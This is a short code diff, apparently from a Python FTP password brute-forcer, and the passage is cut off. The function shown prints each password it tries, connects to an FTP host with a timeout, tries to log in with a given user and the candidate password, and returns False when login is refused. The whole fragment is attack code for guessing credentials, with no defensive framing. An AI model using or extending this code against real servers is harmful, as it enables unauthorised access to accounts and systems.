@@ -15,3 +15,12 @@ def is_correct(password):
     # initialize the FTP server object
     server = ftplib.FTP()
     print(f"[!] Trying", password)
+
+    try:
+        # tries to connect to FTP server with a timeout of 5
+        server.connect(host, port, timeout=5)
+        # login using the credentials (user & password)
+        server.login(user, password)
+    except ftplib.error_perm:
+        # login failed, wrong credentials
+        return False
